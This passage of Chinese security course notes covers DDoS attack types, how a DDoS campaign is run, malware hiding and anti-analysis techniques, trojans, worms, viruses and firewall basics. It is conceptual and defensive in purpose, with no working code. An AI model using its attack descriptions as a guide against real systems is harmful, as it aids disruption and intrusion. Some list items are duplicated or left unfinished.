由于这类攻击甚至只需要发送一个数据包就可以制目标瘫痪，因此也被称为毒药攻击。

- **Sockstress攻击**

  SockStress利用tcp协议的先天不足，消耗目标的内存以及CPU资源，以形成拒绝服务攻击。

  SockStress的攻击原理是：在建立TCP的三次握手的第三次确认时，攻击方将确认需要设置最后一个握手包的window字段置为0并向服务器请求数据传输。服务器发现对方的缓冲区空间为0，则只能一直维持这个链接，并发出TCP的探测报文，询问对方的缓冲区是否有空闲。只要攻击方一直保持window字段为0，则服务器只能一直维持这个连接。

- **NTP攻击**

  NTP是保持计算机时钟同步的一个协议，利用的是UDP的123号端口。当接收到64字节的monlist请求包后，NTP服务器发送会向目标发送100个482字节的响应包，放大700倍以上。

  攻击者只需事先收集到足够数量的NTP服务器，如果向NTP服务器发送一个源地址为目标系统地址的NTP请求包，则就会有大量的响应包文从NTP服务器涌向目标系统。

##### （3）混合型

资源消耗型和以巧制胜型的混合体，吸收了前两种攻击类型的优点，攻击效果惊人，是目前最常见的DDOS攻击类型。

如：SYN Flood、DNS Query Flood等。

DNS Query Flood攻击

DNS Query Flood攻击是攻击者向DNS服务器发送大量DNS解析请求，从而占据DNS缓存，达到拒绝服务的目的。

DNS Query Flood攻击成功的关键是攻击者发送的查询请求都是不同的域名，以消耗DNS缓存。因此，发送者需要预先构造大量与经常访问的域名不同的域名，否则DNS会从已有的缓存记录中返回响应报文。

#### 4、DDoS攻击过程

##### （1）搜集了解目标的情况

下列情况是DDOS能否成功的关键：

- 被攻击目标主机数目、地址情况 
- 目标主机的配置、性能 
- 目标的带宽

对于DDoS攻击者来说，攻击互联网上的某个站点，首先要确定到底有多少台主机在支持这个站点，一个大的网站一般有很多台主机利用负载均衡技术提供同一个网站的www服务。

以yahoo为例，下列地址都提供`http://www.yahoo.com`服务：
66.218.71.87    66.218.71.88
66.218.71.89    66.218.71.80
66.218.71.81    66.218.71.83
66.218.71.84    66.218.71.86 

如果要针对Yahoo的WEB服务进行DDoS攻击，仅攻击一个IP地址是远远不够的话，必须要让所有这些IP地址的主机都被攻击瘫痪才能达到目标。

因此，必须事先搜集情报，了解清楚目标网站的主机规模和网络结构，这关系到使用多少台傀儡机才能达到效果的问题。

##### （2）占领傀儡机 

黑客最感兴趣的是有下列情况的主机： 

- 性能好的主机 
- 负载轻的主机
- 安全管理水平差的主机

黑客通过扫描，寻找互联网上那些有漏洞的机器，包括溢出漏洞、cgi、Unicode、ftp、数据库漏洞等等，并有针对性尝试入侵。入侵成功，即可成为傀儡机。

从俘获的傀儡机中选择若干台做为控制傀儡机，其余的作为攻击傀儡机。

利用ftp分别将DDoS攻击程序和控制程序传送到攻击傀儡机和控制傀儡机上，等待发出攻击指令。

##### （3）实际攻击

当条件成熟或时机到了，攻击者即会发动攻击。与搜集情报和占领傀儡机相比，发动DDOS攻击非常简单：

- 攻击者登录到控制傀儡，并通过控制傀儡机向所有（或部分）攻击傀儡机发出命令；
- 潜伏在攻击傀儡机中的DDoS攻击程序在收到控制傀儡机的攻击命令后即会向目标发送攻击报文。
- 攻击者一边攻击，还会用各种手段来监视攻击的效果，在需要的时候进行一些调整。如：不断侦测攻击效果，如果效果不好则会随时调整攻击策略或增加更多攻击傀儡机加入攻击。

#### 5、DDOS攻击防范

DDOS攻击危害极大，而且在技术上彻底防御和消除DDOS还不现实，需要从多个方面入手，尽量减少由此而带来的损害。

（1）尽可能限制或者阻断ICMP和UDP。ICMP和UDP是两个重要的协议，阻断ICMP和UDP会带来很多不便，最多只适合在网络边界上采用。

（2）实施数据包过滤。即阻断明显的非法数据包出入网络，如源地址为私有或保留地址的数据包出入网络边界，源地址是内网地址的外来数据包，或源地址的外网地址的外出数据包等。

（3）禁止定向广播。在网络边界路由器上禁止对网内的广播，从而避免路由器成为黑客的放大器。

（4）单播反向路由转发（Unicast Reverse Path Forwarding，Unicast RPF）。在边界路由器上对所有外来的数据包进行反向路由检查，凡是无法到达的源地址的IP包都会被丢弃。

（5）限制访问速度。在边界路由器上对某些重要的服务器的访问带宽进行限制，从而保证服务器有充分的时间来应对到达的请求。

## 5.4 恶意代码技术

### 5.4.1 恶意代码基本概念

代码是指计算机程序代码，可以被执行并实现特定功能。如果这些特定功能不是合法计算机用户所希望的功能，或者是为第三方谋取不正当利益，则这样的代码就被视为恶意代码。

恶意软件（Malware）基本上是恶意代码（Malicious Code）的同义词。

#### 1、 恶意代码的定义

是指在未明确提示用户或未经用户许可的情况下，在用户计算机或其他终端上安装运行，侵犯用户合法权益的软件，但已被我国现有法律法规规定的计算机病毒除外。

--中国互联网协会

中国互联网协会定义的恶意软件的表现行为：

- 强制安装：未明确提示用户或未经用户许可的情况下，在用户计算机或其他终端上安装软件的行为。
- 难以卸载：未提供通用的卸载方式，或在不受其他软件影响、人为破坏的情况下，卸载后仍活动程序的行为。
- 浏览器劫持：未经用户许可，修改用户浏览器或其他相关设置，迫使用户访问特定网站或导致用户无法正常上网的行为。
- 广告弹出：未明确提示用户或未经用户许可的情况下，利用安装在用户计算机或其他终端上的软件弹出广告的行为。
- 恶意收集用户信息：未明确提示用户或未经用户许可，恶意收集用户信息的行为。
- 恶意卸载：未明确提示用户、未经用户许可，或误导、欺骗用户卸载非恶意软件的行为。
- 恶意捆绑：指在软件中捆绑已被认定为恶意软件的行为。
- 其他侵犯用户知情权、选择权的恶意行为

#### 2、 恶意代码常见类型

|              |        需要宿主        |        无需宿主        |
| :----------: | :--------------------: | :--------------------: |
| 不能自我复制 | 不感染的依附性恶意代码 | 不感染的独立性恶意代码 |
| 能够自我复制 | 可感染的依附性恶意代码 | 可感染的独立性恶意代码 |

|          类别          |                             实例                             |
| :--------------------: | :----------------------------------------------------------: |
| 不感染的依附性恶意代码 | 特洛伊木马（Trojan horse）逻辑炸弹（Logic bomb）后门（Backdoor）或陷门（Trapdoor） |
| 不感染的独立性恶意代码 |      点滴器（Dropper）繁殖器（Generator）恶作剧（Hoax）      |
| 可感染的依附性恶意代码 |                        病毒（Virus）                         |
| 可感染的独立性恶意代码 |                         蠕虫（Worm）                         |

#### 3、 恶意代码攻击流程

![image-20220508212014012](https://img.moxhub.cn/blog/image-20220508212014012.png)

#### 4、 恶意代码的命名

通常可以从前缀中对恶意代码的类型有所了解：

- Trojan：特洛伊木马，在此类病毒名中有PSW或者PWD之类的一般都表示这个病毒有盗取密码的功能。比如 Trojuan.qqpass.a
- Win32：系统病毒（类似的前缀还有PE、Win95 W32 W95等），可以感染windows操作系统的 *.exe 和 *.dll 文件 
- Worm：蠕虫病毒，通过网络或者系统漏洞进行传播。如冲击波
- Script：脚本病毒，通常还会有VBS、JS等表明是何种脚本编写的前缀。 
- Backdoor：后门病毒，通过网络传播，给系统开后门。灰鸽子最著名。
- Dropper：种植程序病毒，运行时会从体内释放出一个或几个新的病毒到系统目录下。落雪具有较大代表性。
- Joke：玩笑病毒 ，只是吓吓人而已，没什么危害。
- HackTool：黑客工具。
- Downloader：木马下载者，体积小用于下载体积大的木马，方便隐藏。
- AdWare：广告病毒，监视用户的一举一动，并将得到的信息传回服务器。

### 5.4.2 恶意代码的关键技术（重点）

一个相对比较成功的恶意代码，首先必须具有良好隐蔽和生存能力，不踢被用户发觉；其次，还应该具有良好的攻击能力。

一般包括：

- **恶意代码的隐蔽技术** 
- **恶意代码生存技术** 
- **恶意代码攻击技术** 

#### 1、恶意代码的隐藏技术 

恶意代码的隐藏技术包括本地隐藏和通信隐藏两方面。其中：

- 本地隐藏：主要指文件隐藏、进程隐藏、网络连接隐藏、内核模块隐藏、编译器隐藏等
- 网络隐藏：主要指通信内容隐藏和传输通道隐藏。

##### （1）本地隐藏

指为了防止本地系统管理人员觉察而采取的隐蔽手段。本地系统管理人员通常使用“查看进程列表”，“查看目录”，“查看内核模块”，“查看系统网络连接状态”等管理命令来检测系统是否被植入了恶意代码。

- 文件隐蔽：将恶意代码的文件命名为与系统的合法程序文件名相似的名称，或者干脆取而代之，或者将恶意代码文件附加到合法程序文件中。

- 进程隐蔽：通过附着或替换系统进程，使恶意代码以合法服务的身份运行，从而隐蔽恶意代码。还可以通过修改进程列表程序，修改命令行参数使恶意代码进程的信息无法查询。也可以借助RootKit 技术实现进程隐蔽。
- 网络连接隐蔽：借用现有服务的端口来实现网络连接隐蔽，如使用80端口，攻击者在自己的数据包设置特殊标识，通过标识识别连接信息，未标识的WWW 服务网络包仍转交给原服务程序处理。使用隐蔽通道技术进行通信时可以隐蔽恶意代码自身的网络连接。
- 编译器隐蔽：由编译器在对程序代码进行编译时植入恶意代码，从而实现恶意代码在用户程序中的隐藏和原始分发攻击。恶意代码的植入者是编译器开发人员。 
- RootKit隐蔽：利用适当的Rootkit工具，可以很好的隐蔽自身或指定的文件、进程和网络连接等，很难被管理员发现。

##### （2）网络隐藏

网络隐藏主要是指通信内容和传输通道的隐藏。

- 通信内容隐蔽：使用加密算法对所传输的内容进行加密能够隐蔽通信内容。
- 传输通道隐藏：利用隐蔽通道技术，实现对传输通道的隐蔽。

**隐蔽通道技术**

利用加密技术隐蔽通信内容虽然可以保护通信内容，但无法隐蔽通信状态管理员依然可以从网络通信行为中感知隐蔽信息的存在。对于黑客而言，传输信道的隐蔽更加重要。

简单地，隐蔽通道（Covert Channel）是一个不受安全机制控制的、利用共享资源作为通信通路的信息流。包括有：存储隐蔽通道和时间隐蔽通道。

- **存储隐蔽通道**

隐蔽存储通道（covert storage channel）使用共享资源的属性。

一个进程直接或间接地写一个存储单元，另一个进程直接或间接地读该存储单元。

- **时间隐蔽通道**

时间隐蔽通道（covert timing channel ）使用在对共享资源访问中的时态的或排序关系。

一个进程通过调节它对系统资源的使用，影响另外一个进程观察到的真实响应时间，实现一个进程向另一个进程传递信息。

#### 2、恶意代码的生存技术 

恶意代码的生存技术主要包括四种类型：

- 反跟踪技术：通过提高恶意代码分析难度，减少被发现的可能性
- 加密技术：利用加密技术，提高恶意代码自身保护能力
- 加密技术：利用加密技术，提高恶意代码自身保护能力
- 自动生产技术：

##### （1）反跟踪技术

恶意代码采用反跟踪技术可以提高自身的伪装能力和防破译能力，增加检测与清除恶意代码的难度。

常用的反跟踪技术有两类：反动态跟踪技术和反静态分析技术。 

**反动态跟踪技术**主要包括：

- 禁止跟踪中断。针对调试分析工具运行系统的单步中断和断点中断服务程序，恶意代码通过修改中断服务程序的入口地址实现其反跟踪目的。
- 封锁键盘输入和屏幕显示，破坏各种跟踪调试工具运行的必需环境；
- 检测跟踪法。检测跟踪调试时和正常执行时的运行环境、中断入口和时间的差异，根据这些差异采取一定的措施，实现其反跟踪目的。
- 其它反跟踪技术。如指令流队列法和逆指令流法等。

**反静态分析技术**主要包括：

- 程序代码分块加密执行：为了防止程序代码通过反汇编进行静态分析，程序代码以分块的密文形式装入内存，在执行时由解密程序进行译码，某一段代码执行完毕后立即清除，保证任何时刻分析者不可能从内存中得到完整的执行代码；

- 花指令法(Junk Code)，也称为伪指令，是指在指令流中插入“废指令”，使静态反汇编无法得到全部正常的指令，不能有效地进行静态分析此外，伪指令技术还广泛应用于宏病毒与脚本恶意代码之中。

##### （2）加密技术

加密技术是恶意代码自我保护的一种手段，加密技术和反跟踪技术的配合使用，使得分析者无法正常调试和阅读恶意代码，不知道恶意代码的工作原理，也无法抽取特征串。从加密的内容上划分，加密手段分为信息加密、数据加密和程序代码加密三种。

大多数恶意代码对程序体自身加密，另有少数恶意代码对被感染的文件加密。

##### （3）模糊变换技术

模糊变换技术也是恶意代码的一种自我保护技术。通过模糊变换，可以在感染客体时使用不同的代码，实现同一种恶意代码的多个不同代码样本，从而增加基于特征的检测工具的识别难度，提高反恶意软件的误报率。模糊变换技术主要分为5种：

- 指令替换技术：对恶意代码的二进制代码进行反汇编，解码每一条指令，计算出指令长度，并对指令进行同义变换。
- 指令压缩技术：检测恶意代码反汇编后的全部指令，对可进行压缩的一段指令进行同义压缩。
- 指令扩展技术：把每一条汇编指令进行同义扩展，所有压缩技术变换的指令都可以采用扩展技术实施逆变换。
- 花指令技术：在恶意代码程序体中插入无效指令。
- 重编译技术：在恶意代码中携带某些源码，在入侵后进行需要用自带的或者操作系统提供编译器进行重新编译，既可以实现变形的目的，也为跨平台的恶意代码出现打下了基础。

##### （4）自动生产技术

恶意代码自动生产技术是基于人工分析技术，利用“计算机病毒生成器”等工具，使对计算机病毒一无所知的用户也可以组合并生产出算法、功能各异的计算机病毒。

由于产生的恶意代码的程序体会发生变化，基于特征码检测的反恶意代码软件根本无法检测和清除这种恶意代码。

#### 3、恶意代码的攻击技术 

##### （1）进程注入技术

将操作系统和网络的服务程序为载体，恶意代码程序将自身嵌入到这些服务程序中，不但实现了自身的隐藏，而且还能随着服务的加载而启动。

##### （2）三线程技术

一个进程可以同时拥有多个并发线程。三线程技术就是指一个恶意代码进程同时开启了三个线程，其中一个为主线程，负责远程控制的工作。另外两个辅助线程分别是监视和守护线程。其中：

- 监视线程负责检查恶意代码程序是否被删除或被停止自启动。
- 守护线程一般注入到其他进程中，并与恶意代码进程同步，一旦进程被停止，守护线程就会重新启动该进程，并向主线程提供必要的数据，这样就能保证恶意代码运行的可持续性。

##### （3）端口复用技术

指重复利用系统或网络服务打开的端口（如25、80、135和139等常用端口）传送数据，既可以欺骗防火墙，又可以少开新端口。端口复用是在保证端口默认服务正常工作的条件下复用，具有很强的欺骗性。

##### （4）超级管理技术

一些恶意代码还具有攻击反恶意代码软件的能力。为了对抗反恶意代码软件，恶意代码采用超级管理技术对反恶意代码软件系统进行拒绝服务攻击，使反恶意代码软件无法正常运行。

##### （5）端口反向连接技术

一般地，防火墙对于外部网络进入内部网络的数据流有严格的访问控制策略，对于从内网到外网的数据却疏于防范。端口反向连接技术是指使恶意代码的服务端（被控制端）主动连接客户端（控制端）的技术。

##### （6）缓冲区溢出技术

缓冲区溢出漏洞攻击占远程网络攻击的80％以上，是一种可以使一个匿名的Internet 用户有机会获得一台主机的部分或全部的控制权的攻击。恶意代码利用系统和网络服务的安全漏洞植入并且执行攻击代码，攻击代码以一定的权限运行有缓冲区溢出漏洞的程序，从而获得被攻击主机的控制权。

### 5.4.3 常见的恶意代码

#### 1、特洛伊木马

木马是“特洛伊木马”（trojan horse）的简称，来源于荷马史诗《伊利亚特》中的希腊神话《木马屠城记》。黑客程序借用其名，有“一经潜入，后患无穷”之意。

在计算机系统中，“特洛伊木马”指系统中被植入的、人为设计的程序，目的包括通过网络远程控制其他用户的计算机系统，窃取信息资料，并可恶意致使计算机系统瘫痪。

得到大多数安全专家认可的定义:“特洛伊木马是一段能实现有用的或必需的功能的程序，但是同时还完成一些不为人知的功能。”

**木马的基本组成**

本质上，木马大多都是以客户/服务程序的模式为基础，常由一个攻击者控制的客户端程序和一个（或多个）运行在被控计算机端的服务端程序组成。

##### （1）植入（传播）技术

植入（传播）技术是指将木马程序安装到目标系统内部时采用的技术，可以分为主动植入与被动植入两类。

**主动植入**

攻击者主动将木马程序安装目标系统上，这个行为过程完全由攻击者主动掌握。一般需要通过某种方法获取目标系统的权限，然后由攻击者自己动手进行安装。不仅需要有写权限，还需要有执行的权限。

**被动植入**

攻击者预先设置某种环境，被动等待目标系统用户的某种可能的操作，只有这种操作执行，木马程序才有可能植入目标系统，如：浏览网页、阅读电子邮件、网络下载、即时通信、移动介质、软件捆绑等。

##### （2）木马的分类

- 远程控制型木马：可以让攻击者完全控制被感染的计算机

- 密码发送型木马：专门为了盗取被感染主机上的密码

- 破坏型木马：破坏被感染主机上的文件系统

- 键盘记录型木马：记录受害者的键盘敲击

- 拒绝服务攻击木马

- 反弹端口型木马	：服务端（被控制端）使用主动端口，客户端(控制端)使用被动端口

- 代理木马：变为攻击者发动攻击的跳板


##### （3）木马的特点

- 隐蔽性：这是木马程序与远程控制程序的主要区别
- 欺骗性：为了达到隐蔽目的，木马常常使用和系统相关的一些文件名来隐蔽自身。
- 顽固性：很多木马的功能模块已不再是由单一的文件组成，而是具有多重备份
- 危害性：攻击者可以通过客户端强大的控制和破坏力对主机进行操作。
- 潜伏性：木马种植到系统后一般不会马上发作，而是要等到与控制端连接之后才会接受指令而动作。

##### （4）木马的防范

- 利用工具查杀木马
- 查看系统注册表
- 检查网络通信状态
- 查看目前的运行任务
- 查看系统启动项
- 使用内存检测工具检查
- 用户安全意识策略 
- 纵深防御保护系统安全 

#### 2、蠕虫（重点）

蠕虫是一种智能化、自动化并综合网络攻击、密码学和计算机病毒技术，可自行运行的攻击程序或代码。蠕虫能够扫描和攻击网络上存在系统漏洞的节点主机，并通过网络自主的从一个节点传播到另一个节点。

##### （1）莫里斯蠕虫事件

发生于1988年11月2日，导致大约6000台机器瘫痪。

##### （2）蠕虫的基本结构

蠕虫的基本程序结构包括传播模块、隐藏模块和目的功能模块。

传播模块又可以分为扫描、攻击和复制三个基本模块。

##### （3）蠕虫的传播机制

- 信息收集：按照一定的策略搜索网络中存活的主机，收集目标主机的信息，并远程进行漏洞的分析。如果目标主机上有可以利用的漏洞则确定为一个可以攻击的主机，否则放弃攻击。
- 攻击渗透：通过收集的漏洞信息尝试攻击，一旦攻击成功，则获得控制该主机的权限，将蠕虫代码渗透到被攻击主机。
- 现场处理：攻击成功后，开始对被攻击的主机进行一些处理工作，将攻击代码隐藏，为了能使被攻击主机运行蠕虫代码，还要通过注册表将蠕虫程序设为自启动状态；可以完成它想完成的任何动作，如恶意占用CPU资源；收集被攻击主机的敏感信息，可以危害被感染的主机，删除关键文件。 

##### （4）蠕虫的特点

- 主动攻击：从搜索漏洞，到利用搜索结果攻击系统，再到攻击成功后复制副本，整个流程全由蠕虫自身主动完成。
- 利用软件漏洞：蠕虫利用系统的漏洞获得被攻击的计算机系统的相应权限，使之进行复制和传播过程成为可能。
- 造成网络拥塞：在传播的过程中，蠕虫需要判断其它计算机是否存活；判断特定应用服务是否存在；判断漏洞是否存在等等，这将产生大量的网络数据流量。同时出于攻击网络的需要，蠕虫也可以产生大量恶意流量，当大量的机器感染蠕虫时，就会产生巨大的网络流量，导致整个网络瘫痪。
- 消耗系统资源：蠕虫入侵到计算机系统之后，一方面由于要搜索目标主机、漏洞、感染其它主机需要消耗一定的资源；另一方面，许多蠕虫会恶意耗费系统的资源。
- 留下安全隐患：大部分蠕虫会搜集、扩散、暴露系统敏感信息（如用户信息等），并在系统中留下后门。
- 行踪隐蔽：蠕虫的传播过程中，不需要用户的辅助工作，其传播的过程中用户基本上不可察觉。
- 反复性：即使清除了蠕虫留下的任何痕迹，如果没有修补计算机系统漏洞，网络中的计算机还是会被重新感染。
- 破坏性：越来越多的蠕虫开始包含恶意代码，破坏被攻击的计算机系统，而且造成的经济损失数目越来越大。

##### （5）蠕虫的防御和清除 

- 系统漏洞打补丁：蠕虫大多数都是利用系统漏洞进行传播，因此在清除蠕虫之前必须将蠕虫利用的相关漏洞进行修补。
- 清除正在运行的蠕虫进程：每个进入内存的蠕虫一般会以进程的形式存在，只要清除了该进程，就可以使蠕虫失效。
- 删除蠕虫的自启动项：感染蠕虫主机用户一般不可能启动蠕虫，蠕虫需要就自己启动。需要在这些自启动项中清除蠕虫的设置。
- 删除蠕虫文件：通过蠕虫在注册表的键值可以知道病毒的躲藏位置，对于那些正在运行或被调用的文件无法直接删除，可以借助于相关工具删除。
- 利用自动防护工具：通过包括个人防火墙软件等防护工具，可以设置禁止不必要的服务。另外也可以设置监控自己主机有那些恶意的流量。

##### （6）举例 

红色代码（codered）病毒是一种结合了病毒、木马、DDOS机制的蠕虫。2001年7月15日首次爆发。

2001年7月中旬，在美国等地大规模蔓延。

2001年8月初，出现变种coderedII，针对中文版windows系统，国内大规模蔓延。

- 通过80端口传播。
- 只在网络服务器的内存，不通过文件载体。
- 利用IIS缓冲区溢出漏洞。
- 感染超过25万台。
- 主要影响WindowsNT和Windows2000服务器

#### 3、计算机病毒

计算机病毒（Computer virus）指编制或者在计算机程序中插入的破坏计算机功能或者破坏数据，影响计算机使用并且能够自我复制的一组计算机指令或者程序代码。

计算机病毒就像生物病也一样，有独特的复制能力，可以很快地蔓延，而且常常难以根除。它们能把自身附着在各类类型的文件上。当文件被复制或从一个用户传送到另外一个用户时，它们就随同文件一起蔓延开来。

##### （1）计算机病毒的结构

计算机病毒的构成通常均三部分：传播机制、破坏机制、触发机制。

- 传染机制：指计算机病毒由一个宿主传播到另一个宿主程序，由一个系统进入另一个系统的过程。 
- 触发机制：计算机病毒在传染和发作之前，要判断某些特定条件是否满足，这个条件就是计算机病毒的触发条件。
- 破坏机制：良性病毒表现为占用内存或硬盘资源。恶性病毒则会对目标主机系统或信息产生严重破坏。 

##### （2）计算机病毒的分类

![](https://pic.imgdb.cn/item/62775bbe0947543129a0f164.jpg)

##### （3）计算机病毒的特性

根据对计算机病毒的产生、传播和破坏行为的分析，可以将计算机病毒概括为以下6 个主要特性：

- 传染（播）性：指病毒具有把自身复制到其它程序或其他主机中。 
- 取得系统控制权
- 隐蔽性：通过隐蔽技术使宿主程序的大小没有改变，以至于很难被发现。 
- 破坏性：计算机所有资源包括硬件资源和软件资源，软件所能接触的地方均可能受到计算机病毒的破坏
- 潜伏性：长期隐藏在系统中，只有在满足特定条件时，才启动其破坏模块。 
- 不可预见性

##### （4）计算机病毒的传播途径

- 不可移动的计算机硬件设备进行传播，即利用专用ASIC 芯片和硬盘进行传播；
- 移动存储设备来传播，其中U盘和移动硬盘是使用最广泛、移动最频繁的存储介质；
- 计算机网络进行传播；
- 点对点通信系统和无线通道传播。

##### （5）计算机病毒的防范

- 养成良好的安全习惯
- 安装防火墙和专业的杀毒软件进行全面监控
- 经常升级操作系统的安全补丁
- 迅速隔离受感染的计算机
- 及时备份计算机中有价值的信息

#### 4、 病毒\木马\蠕虫的区别

|              |       **病** **毒**        |             **木** **马**              |              **蠕** **虫**               |
| :----------: | :------------------------: | :------------------------------------: | :--------------------------------------: |
| **存在形式** |            寄生            |                独立个体                |                 独立个体                 |
| **传播途径** |      通过宿主程序运行      |              植入目标主机              |            通过系统存在的漏洞            |
| **传播速度** |             慢             |                  最慢                  |                    快                    |
| **攻击目标** |          本地文件          |    本地文件和系统、网络上的其他主机    |                 程序自身                 |
| **触发机制** |        计算机操作者        |              计算机操作者              |                 程序自身                 |
| **防治方法** |      从宿主文件中摘除      |      停止并删除计算机木马服务程序      |              为系统打上补丁              |
| **对抗主体** | 计算机使用者、反病毒供应商 | 计算机使用者和防病毒供应商、网络管理者 | 计算机使用者、系统软件供应商、网络管理者 |

# 第6章 网络攻防技术基础

## 6.1 网络防御概述

### 6.1.1 意义

进攻与防御是对立统一的矛盾体。进攻常常是为了有效的防御，而防御也常常是为了更好的进攻。在网络空间中，如果只会进攻不懂防御，注定不会在网络攻防对抗中取得最终胜利。 

### 6.1.2 被动防御技术和主动防御技术

被动安全防御也称为传统的安全防御，主要是指以抵御网络攻击为目的的安全防御方法。

被动安全防御技术有：防火墙技术、加密技术、VPN技术

主动网络安全防御则是以及时发现正在遭受攻击，并及时采用各种措施阻止攻击者达到攻击目的，尽可能减少自身损失的网络安全防御方法。

主动安全防御技术有：网络安全态势预警、入侵检测、网络引诱（蜜罐、蜜网）、安全反击等技术。

### 6.1.3 网络安全纵深防御体系

网络安全的纵深防御（Defense in depth）的思想是指通过设置多重安全防御系统，实现各防御系统之间的相互补充，即使某一系统失效也能得到其他防御系统的弥补或纠正。网络安全的纵深防御（Defense in depth）的思想是指通过设置多重安全防御系统，实现各防御系统之间的相互补充，即使某一系统失效也能得到其他防御系统的弥补或纠正。

### 6.1.4 主要防御技术

1. 防火墙技术：防火墙是一种较早使用、实用性很强的网络安全防御技术，是最主要的被动安全防御技术之一。防火墙主要用于逻辑隔离不可信的外部网络与受保护的内部网络，或者说是用于对不同安全域的隔离。

2. 虚拟专用网技术：虚拟专用网（Virtual Private Network， VPN）也是一种较早使用、实用性很强的网络安全被动防御技术，其主要的作用是通过加密技术，在不安全的网络中构建一个安全的传输通道，是加密和认证技术在网络传输中的应用。

3. 入侵检测与防护技术入侵检测与防护技术属于主动防御技术，主要有两种：入 入侵检测系统(IDS)注重的是网络安全状况的监管，通过监视网络或系统资源，寻找违反安全策略的行为或攻击迹缘，并发出报警和入侵防护系统(IPS)则倾向于提供主动防护，注重对入侵行为的控制。其设计宗旨是预先对入侵活动和攻击性网络流量进行拦截，避免其造成损失。

4. 网络蜜罐技术是一种主动防御技术，是一个“诱捕”攻击者的陷阱技术。蜜罐系统是一个包含漏洞的诱骗系统，通过模拟一个或多个易受攻击的主机和服务，给攻击者提供一个容易攻击的目标。攻击者往往在蜜罐上浪费时间，延缓对真正目标的攻击，而且可以为安全人员获得入侵取证提供重要的信息和有用的线索，便于研究入侵者的攻击行为。

## 6.2 防火墙基础

### 6.2.1 定义

防火墙特指一种在本地网络与外界网络之间的安全防御系统。作为一种非常有效的网络安全系统，防火墙能够隔离风险区域与安全区域的连接，同时不会妨碍安全区域对风险区域的访问。

### 6.2.2 属性

防火墙是不同网络或者安全域之间信息流的唯一通道，所有双向数据流必须经过防火墙。

只有经过授权的合法数据，即防火墙安全策略允许的数据才可以通过防火墙。

防火墙系统应具有很高的抗攻击能力，并且其自身还不受各种攻击的影响。

### 6.2.3 基本要求

保障信任网络（内部网）的安全

保证信任网络与非信任网络（外部网）之间的连通

### 6.2.4 作用

**分离器**：隔离风险区域，同时不妨碍对风险区域的访问；

**限制器**：不同网络或网络安全域之间信息的出入口并根据安全策略控制出入网络的信息流；

分析器：监控进出网络的信息流，仅让安全、核准了的信息进入，抵御对有安全威胁的数据包，从而完成看似不可能的任务。

### 6.2.5 基本要素

安全策略，信任网络（内部网），非信任网络（外部网），技术手段

### 6.2.6 位置

#### 1. 物理位置

在现实中，防火墙通常被部署在任何有访问控制需要的场合，比如局域网边界、两个不同的网络之间等。

#### 2. 逻辑位置

逻辑位置指的是防火墙与ISO OSI模型对应的逻辑层次关系。处于不同层次的防火墙实现不同级别的过滤功能，其特性也不同。

一般说来，工作层次越高，能检查的信息就越多，其提供的安全保护等级就越高，复杂程度和实现难度也越大。

| ISO OSI/RM七层模型 | 防火墙级别 |
| ------------------ | ---------- |
| 应用层             | 网关级     |
| 表示层             |            |
| 会话层             |            |
| 传输层             | 电路级     |
| 网络层             | 路由器级   |
| 数据连路层         | 网桥级     |
| 物理层             | 中继器级   |

 中继器级：不是严格意义上的防火墙，主要进行电磁辐射防护、物理物理隔离等。如网闸。

 网桥级：透明模式的防火墙。本质上是利用防火墙连接了同一个网络的不同部分，用户感觉不到防火墙的存在，但在支持的功能方面有所欠缺。

 路由器级：最主流的防火墙模式。防火墙处于网络边界或者两个不同网络之间，检查数据包的源、目的IP地址以及包首部的其他标志来确定是否允许数据包通过防火墙。

 电路级：仅起到一种代理的作用，是一个安装专用软件的主机，并由其代表被保护主机与外界进行通信，也称为电路级代理。SOCKS协议是最著名的电路级代理协议。	

 网关级：也称应用层代理服务器，通常是一个安装了代理软件的主机，每一种应用都需要一个相应的代理软件。外界只能访问代理服务器而无法直接与被保护主机建立连接。

### 6.2.7 不足

 作为网络边界防护机制，防火墙无法防范的安全威胁：

* **来自网络内部的安全威胁**

* **通过非法外联的网络攻击**

* **数据驱动型攻击（计算机病毒传播）**

 由于技术原因，无法有效防范的安全威胁：

* **针对开放服务安全漏洞的渗透攻击**

* **针对网络客户端程序的渗透攻击**

* **基于隐蔽通道进行通信的特洛伊木马或僵尸网络**

### 6.2.8 技术类型

**包过滤防火墙(packet filter)**

1988, DEC

网络包粒度 工作在传输层与网络层之间 主要实现形式为路由器ACL

**状态防火墙(stateful firewall)**

1989, AT&T Bell

网络会话粒度,工作在传输层与网络层之间

目前防火墙最主要实现方式

**应用层代理防火墙(application layer firewall)**

Paper: 1990 Purdue, AT&T

Product: 1991 DEC

工作在应用层

### 6.2.9 包过滤防火墙

#### 1. 基本思想及实现原理

使用同一组规则，对到达的每个IP包进行匹配判断，并根据匹配成功与否决定转发或丢弃。

通常以到达数据包中的源、目标IP地址，以及源、目的端口号为判断对象

只要有一条规则被匹配，就根据规则决定其后续动作，不再匹配剩余规则

如果所有规则均未匹配，则采取默认规则

通常需要双向配置

#### 2. 过滤规则及表示方式

主要过滤规则：

* 拒绝来自某主机或某网段的所有连接。

* 允许来自某主机或某网段的所有连接。

* 拒绝来自某主机或某网段的指定端口的连接。

* 允许来自某主机或某网段的指定端口的连接。

* 拒绝本地主机或本地网络与其它主机或其它网络的所有连接。

* 允许本地主机或本地网络与其它主机或其它网络的所有连接。

* 拒绝本地主机或本地网络与其它主机或其它网络的指定端口的连接。

* 允许本地主机或本地网络与其它主机或其它网络的指定端口的连接。

典型的过滤规则表示格式包括规则号、匹配条件、匹配操作三部分：

* **规则号**：规则标识符，通常用一个整数表示，如0-199。有些厂商（如思科公司）的产品也允许用一个标示符(如myacl)进行表示。
* **匹配条件**：描述过滤规则条件，通常用源IP地址、目的IP地址、源端口号、目的端口号、协议类型(UDP，TCP，ICMP)、通信方向及规则运算符（如e ,range）等。
* **匹配操作**：满足匹配条件后防火墙应采取的操作，通常有拒绝、转发、审计等三种。

根据经过防火墙的数据包中的某些数据项信息，决定是否允许该数据包通过。

判断依据有(只考虑IP包)：

* 数据包协议类型：TCP、UDP、ICMP、IGMP等

* 源、目的IP地址

* 源、目的端口：FTP、HTTP、DNS等

* IP选项：源路由、记录路由等

* TCP选项：SYN、ACK、FIN、RST等

* 其它协议选项：ICMP ECHO、ICMP ECHO REPLY等

* 数据包流向：in或out

* 数据包流经网络接口：eth0、eth1

### 6.2.10主要特点

包过滤防火墙实际上就是一种网络层的访问控制技术，通常可以在路由器上通过配置ACL的方式实现。

仅仅根据数据包自身包含的信息(协议头部)进行检查和过滤并没有考虑连接的状态。

**优点**：实现简单；对用户透明；效率高

**缺点**：正确制定规则并不容易；不可能引入认证机制

### 6.2.11状态防火墙

